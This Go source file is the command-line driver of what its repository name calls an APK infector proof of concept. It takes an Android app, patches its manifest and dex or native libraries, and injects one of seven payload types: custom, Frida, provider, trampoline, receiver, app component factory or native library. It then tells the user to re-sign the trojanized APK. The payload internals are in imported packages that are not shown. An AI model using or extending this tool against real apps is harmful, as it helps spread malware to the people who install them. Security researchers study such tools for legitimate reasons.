// author: Thatskriptkid (www.orderofsixangles.com)
// You can use my kaitai struct for binary manifest.
// https://github.com/thatskriptkid/Kaitai-Struct-Android-Manifest-binary-XML

package main

import (
	"encoding/xml"
	"fmt"
	"log"
	"os"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
)

var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)"

func main() {

	//setup logging
	logFile, err := os.OpenFile("apkinfector.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	defer logFile.Close()

	log.SetOutput(logFile)

	if os.Args[1] == "-h" {
		fmt.Println(help_str)
		return
	}

	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2" && os.Args[4] != "3" && os.Args[4] != "4" && os.Args[4] != "5" && os.Args[4] != "6" && os.Args[4] != "7") {
		fmt.Println(help_str)
		return
	}

	if os.Args[4] == "1" {
		utils.Payload_option = int(utils.Custom_payload)
	} else if os.Args[4] == "2" {
		utils.Payload_option = int(utils.Frida_payload)
	} else if os.Args[4] == "3" {
		utils.Payload_option = int(utils.Provider_payload)
	} else if os.Args[4] == "4" {
		utils.Payload_option = int(utils.Trampoline_payload)
	} else if os.Args[4] == "5" {
		utils.Payload_option = int(utils.Receiver_payload)
	} else if os.Args[4] == "6" {
		utils.Payload_option = int(utils.AppComponentFactory_payload)
	} else if os.Args[4] == "7" {
		utils.Payload_option = int(utils.Native_payload)
	}

	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
	// 	fmt.Printf("Invalid file path %s %s", os.Args[1], os.Args[2])
	// 	return
	// }

	fmt.Println("Parsing APK...")
	if utils.Payload_option == int(utils.Native_payload) {
		// The native vector edits lib/<abi>/*.so only -- it never needs the
		// manifest, and split APKs have manifests this parser cannot handle.
		fmt.Println("	--Skipped: the native vector works on lib/<abi> only")
	} else {
		manifestPlainFile, err := os.Create(manifest.PlainPath) // create/truncate the file
		if err != nil {
			log.Panic("Failed to create AndroidManifest plaintext", err)
		} else {
			enc := xml.NewEncoder(manifestPlainFile)
			enc.Indent("", "	")
			manifest.ParseApk(os.Args[1], enc)
			//close before reading
			manifestPlainFile.Close()
		}
	}

	fmt.Println("Patching APK")
	if utils.Payload_option == int(utils.Provider_payload) {
		fmt.Println("\t--Patching manifest (provider inject)...")
		manifest.PatchProvider()
	} else if utils.Payload_option == int(utils.Trampoline_payload) {
		fmt.Println("\t--Patching manifest (trampoline inject)...")
		manifest.PatchTrampoline()
	} else if utils.Payload_option == int(utils.Receiver_payload) {
		fmt.Println("	--Patching manifest (receiver inject)...")
		manifest.PatchReceiver()
	} else if utils.Payload_option == int(utils.AppComponentFactory_payload) {
		fmt.Println("	--Patching manifest (app component factory inject)...")
		manifest.PatchAppComponentFactory()
	} else if utils.Payload_option == int(utils.Native_payload) {
		// The native vector does not touch the manifest or the dex at all.
		fmt.Println("	--Native vector: manifest and dex left untouched")
	} else {
		fmt.Println("\t--Patching manifest...")
		manifest.Patch()

		fmt.Println("\t--Patching dex...")
		dex.Patch()
	}

	fmt.Println("Injecting...")
	injector.Inject(os.Args[1], os.Args[2])

	utils.Cleanup()

	fmt.Println("Done! Now you should sign your apk")
}
